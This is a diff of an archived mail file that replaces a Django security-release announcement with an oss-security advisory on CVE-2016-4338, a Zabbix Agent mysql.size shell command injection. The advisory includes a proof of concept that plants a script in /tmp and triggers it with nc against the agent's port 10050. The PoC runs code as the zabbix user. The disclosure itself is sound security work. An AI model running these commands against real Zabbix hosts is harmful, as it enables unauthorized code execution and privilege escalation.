@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["504" "Wednesday" "1" "August" "2018" "10:38:34" "-0400" "Tim Graham" "timograham@gmail.com" "<CAD-rxRD5+AiEA_qgNh0AWuz7VU8ALGgL2Quowz5sfVzvP6FhjA@mail.gmail.com>" "10" "[oss-security] Django security releases issued: 1.11.15 and 2.0.8" nil nil nil "8" "2018080114:38:34" "[oss-security] Django security releases issued: 1.11.15 and 2.0.8" (number mark "U       timograham@g Aug  1   10/504   " thread-indent "\"[oss-security] Django security releases issued: 1.11.15 and 2.0.8\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3707" "Wednesday" "4" "May" "2016" "12:28:13" "+0300" "Timo Juhani Lindfors" "timo.lindfors@iki.fi" "<84vb2uf9zm.fsf@sauna.l.org>" "91" "[oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection" "^Date:" nil nil "5" "2016050409:28:13" "[oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection" (number mark "U       timo.lindfor May  4   91/3707  " thread-indent "\"[oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7760 invoked by uid 550); 1 Aug 2018 14:38:59 -0000
+Received: (qmail 21885 invoked by uid 550); 4 May 2016 09:44:22 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,50 +11,108 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-Received: (qmail 7725 invoked from network); 1 Aug 2018 14:38:58 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20161025;
-        h=mime-version:from:date:message-id:subject:to:cc;
-        bh=s1v2E27AiC7Ns6Q9ti/dlSTIRWu9rzCaiCZIQ0AFleI=;
-        b=On3gDw3Z8rM6VJQdzOnoz6yGLTJb/fdTcrJs3gfAsxxaTOAoEsgOI0IpIoPV0dyr7w
-         gcj2mleF5mPYl+WV322rhcWVX+NcwOhrGz8ReGFiqcINtBd/i1PtAW84r0E/DDpAsstH
-         /SqbI2FnCBG+UeWApxdkYNpxKlbbK/GH+GuuXsYN+fPTM3hQAA5udaa0y2CtxuEaHycX
-         Uz7CM+SYjgnQMA6B5bDw5Dutq6o3KCUHogMi29qh9RELy9dLgV1i7/s1XDH5K7sc4Qb0
-         VTfIiMCUZc/Zcol7vC+/mXgNE6KLuAf0UWSLHKqsKyP9kK3Gqe3fFV+62Pf+/zGxxgKJ
-         I4mg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
-        bh=s1v2E27AiC7Ns6Q9ti/dlSTIRWu9rzCaiCZIQ0AFleI=;
-        b=Grlz9IEDZAvLPDhTyaLsxI3iRgFnvReXSfqCCU/+7sBQdYGAm1FFIzn28Vb87OxJ7C
-         yODBqZCsjO3gIJgSHQgdnYv3RoYY6BNwEoWZFY/+CFwkghjj6q/Jouip4jeLg7lbAKxW
-         1FQQglbkxBoV6q7QXOnSnB2PvFmyQivpMmX6aOqa/+t+yrDivim1+wrJkajR7JLpdO07
-         ZO2jq6QjrDm5QCQXVEFvnIMjoXIlxuaaSgHZ7Gbpll22Pz5mxs01cF95R0LP5GZ0dPG9
-         hvg5LZuGFGLK7RE8+VLsAc7Z/4AEqs+NPgkm2pez+1/bs9sifGsQ5saBhNyhaOwQVpj+
-         4yAw==
-X-Gm-Message-State: AOUpUlH0c3By1wiX/bbNk1sL2QzMfrp/wUcBqJib8DGRedOuAXaGjuLH
-	N5jnLuuxcXOeq9SC2ip6fCWzfU1s0MsM5EkGPJM=
-X-Google-Smtp-Source: AAOMgpfFtzWMS16iEpU5mTD3qDjev3iekqjWx+2JWPtOXj/zdi3Ucp2I+ILKFlRcQAgtJAdo1Esxaj+mQyrbss9T6kc=
-X-Received: by 2002:a6b:c693:: with SMTP id w141-v6mr3538351iof.79.1533134326451;
- Wed, 01 Aug 2018 07:38:46 -0700 (PDT)
+Received: (qmail 32413 invoked from network); 4 May 2016 09:28:25 -0000
+Message-ID: <84vb2uf9zm.fsf@sauna.l.org>
+User-Agent: Gnus/5.13 (Gnus v5.13) Emacs/23.2 (gnu/linux)
 MIME-Version: 1.0
-From: Tim Graham <timograham@gmail.com>
-Date: Wed, 1 Aug 2018 10:38:34 -0400
-Message-ID: <CAD-rxRD5+AiEA_qgNh0AWuz7VU8ALGgL2Quowz5sfVzvP6FhjA@mail.gmail.com>
-To: django-announce@googlegroups.com
-Cc: django-users@googlegroups.com, 
-	"Django developers (Contributions to Django itself)" <django-developers@googlegroups.com>, oss-security@lists.openwall.com
-Content-Type: text/plain; charset="UTF-8"
-Subject: [oss-security] Django security releases issued: 1.11.15 and 2.0.8
+Content-Type: text/plain; charset=us-ascii
+X-SA-Exim-Connect-IP: 2001:2003:f813:ef00:222:15ff:fe58:71e8
+X-SA-Exim-Mail-From: timo.lindfors@iki.fi
+X-SA-Exim-Scanned: No (on mail.kapsi.fi); SAEximRunCond expanded to false
+Date: Wed, 04 May 2016 12:28:13 +0300
+From: Timo Juhani Lindfors <timo.lindfors@iki.fi>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection
+To: oss-security@lists.openwall.com
 
-Today the Django team issued 1.11.15 and 2.0.8 as part of our security
-process. These releases address a security issue, and we encourage all
-users to upgrade as soon as possible:
+CVE-2016-4338: Zabbix Agent 3.0.1 mysql.size shell command injection
+--------------------------------------------------------------------
 
-https://www.djangoproject.com/weblog/2018/aug/01/security-releases/
+Affected products
+=================
 
-As a reminder, we ask that potential security issues be reported via
-private email to security@djangoproject.com and not via Django's Trac
-instance or the django-developers list. Please see
-https://www.djangoproject.com/security for further information.
+At least Zabbix Agent 1:3.0.1-1+wheezy from
+http://repo.zabbix.com/zabbix/3.0/debian is vulnerable. Other versions
+were not tested.
+
+Background
+==========
+
+"Zabbix agent is deployed on a monitoring target to actively monitor
+ local resources and applications (hard drives, memory, processor
+ statistics etc).
+
+ The agent gathers operational information locally and reports data to
+ Zabbix server for further processing. In case of failures (such as a
+ hard disk running full or a crashed service process), Zabbix server
+ can actively alert the administrators of the particular machine that
+ reported the failure.
+
+ Zabbix agents are extremely efficient because of use of native system
+ calls for gathering statistical information."
+
+ -- https://www.zabbix.com/documentation/3.0/manual/concepts/agent
+
+Description
+===========
+
+Zabbix agent listens on port 10050 for connections from the Zabbix
+server. The commands can be built-in or user-defined.
+
+The mysql.size user parameter defined in
+/etc/zabbix/zabbix_agentd.d/userparameter_mysql.conf takes three input
+parameters and uses a shell script to generate an SQL query:
+
+UserParameter=mysql.size[*],echo "select sum($(case "$3" in both|"") echo "data_length+index_length";; data|index) echo "$3_length";; free) echo "data_free";; esac)) from information_schema.tables$([[ "$1" = "all" || ! "$1" ]] || echo " where table_schema='$1'")$([[ "$2" = "all" || ! "$2" ]] || echo "and table_name='$2'");" | HOME=/var/lib/zabbix mysql -N
+
+The code assumes that /bin/sh is bash that supports the [[ compound
+command. However, if /bin/sh is for example dash the statement
+
+[[ "$1" = "all" || ! "$1" ]]
+
+ends up executing the command "$1" with the argument "]]".
+
+Exploit
+=======
+
+Zabbix sanitizes the input and blocks many dangerous characters
+("\\'\"`*?[]{}~$!&;()<>|#@\n"). Since we cannot use quotes we cannot
+give our shell commands any parameters which significantly reduces the
+impact of this vulnerability. If you find a way to execute arbitrary
+commands using this flaw I'd be really interested in the details. The
+following proof-of-concept shows how the vulnerability can be used
+escalate privileges locally:
+
+$ echo -en '#!/bin/bash\necho "This code is running as $(id)" 1>&2\n' > /tmp/owned
+$ chmod a+rx /tmp/owned
+$ echo 'mysql.size[/tmp/owned,all,both]' | nc localhost 10050 | cat -A
+ZBXD^AM-^O^@^@^@^@^@^@^@sh: 1: [[: not found$
+This code is running as uid=110(zabbix) gid=114(zabbix) groups=114(zabbix)$
+sh: 1: [[: not found$
+sh: 1: all: not found$
+
+The exploit of course assumes that the Server line in the
+configuration includes "127.0.0.1". If the agent is configured to
+accept connections only from the Zabbix server. In that case this
+issue can only be exploited from the server or by spoofing the IP
+address of the server (with for example ARP spoofing).
+
+Since output of the command is piped to mysql it might be possible to
+also execute some SQL commands in the database.
+
+Author
+======
+
+This issue was discovered by Timo Lindfors from Nixu Corporation.
+
+Timeline
+========
+
+2016-04-19: Issue discovered and reported internally for verification.
+2016-04-21: Issue reported to vendor.
+2016-04-22: Vendor acknowledges vulnerability and starts patching.
+2016-04-26: Asked status update from vendor.
+2016-04-26: Vendor responds that the issue is still being patched.
+2016-04-26: CVE requested from MITRE.
+2016-04-28: MITRE assigned CVE-2016-4338 for this vulnerability.
+2016-05-02: Vendor published details in the issue tracker https://support.zabbix.com/browse/ZBX-10741
